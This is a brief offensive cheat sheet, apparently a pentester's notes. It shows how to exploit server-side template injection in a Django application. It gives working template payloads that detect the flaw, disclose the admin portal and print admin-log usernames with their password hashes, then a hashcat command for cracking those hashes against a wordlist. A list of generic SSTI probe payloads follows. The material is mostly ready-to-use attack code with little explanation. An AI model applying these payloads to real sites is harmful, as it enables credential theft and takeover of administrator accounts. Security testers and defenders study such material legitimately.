***
### Exfiltration of sensitive data with SSTI
Detection:
```django
{% if 'ahsan' == 'ahsan' %} a {% endif %}
```
Debugging:
```django
{% debug %}
```
I got to know I have to pwn it

Disclosing Admin Portal:
```django
{% include 'admin/base.html' %} #/secret-admin-portal
```
Disclosing Credetials:
```django
{% load log %}{% get_admin_log 10 %}{% for e in log %}{{e.user.get_username}} : {{e.user.password}} {% endfor %%}
```
Dumped Django Hashed Credentials

Dencrypted Using Hashcat:
```bash
hascat -m 10000 hashed_passwords rockyou.txt
```
Django Admin Panel Pwn

---
### SSTI (Server Side Template Injection) Payload List
```
{7*7}
*{7*7}
{{7*7}}
[[7*7]]
${7*7}
@(7*7)
<?=7*7?>
<%= 7*7 %>
${= 7*7}
{{= 7*7}}
${{7*7}}
#{7*7}
[=7*7]
```